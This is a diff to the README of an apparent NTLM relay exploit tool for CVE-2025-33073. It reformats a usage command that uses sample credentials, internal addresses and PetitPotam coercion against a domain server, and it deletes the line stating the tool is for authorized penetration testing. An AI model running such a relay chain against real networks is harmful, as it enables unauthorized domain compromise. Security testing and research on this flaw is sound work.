@@ -1,6 +1,6 @@
 # CVE-2025-33073 Exploit Chain - Debug & Protocol Trace
 
-NTLM relay exploit chain with full protocol-level tracing across LDAP, DNS, SMB, and RPC. Built for authorized penetration testing to diagnose why the chain succeeds on some targets and fails on others.
+NTLM relay exploit chain with full protocol-level tracing across LDAP, DNS, SMB, and RPC. Built to diagnose why the chain succeeds on some targets and fails on others.
 
 ## Requirements
 
@@ -17,15 +17,8 @@ Run `./setup.sh` to create the venv and install dependencies.
 ## Usage
 
 ```bash
-python3 exploit_trace.py \
-  -u 'CORP\jsmith' \
-  -p 'Summer2025!' \
-  -d 192.168.1.50 \
-  --dns-ip 10.10.10.1 \
-  --dc-fqdn dc01.corp.local \
-  --target srv01.corp.local \
-  --target-ip 10.10.10.20 \
-  -M PetitPotam
+python3 exploit_trace.py -u 'CORP\jsmith' -p 'Summer2025!' -d 192.168.1.50 --dns-ip 10.10.10.1 \
+  --dc-fqdn dc01.corp.local --target srv01.corp.local --target-ip 10.10.10.20 -M PetitPotam
 ```
 
 ### Arguments
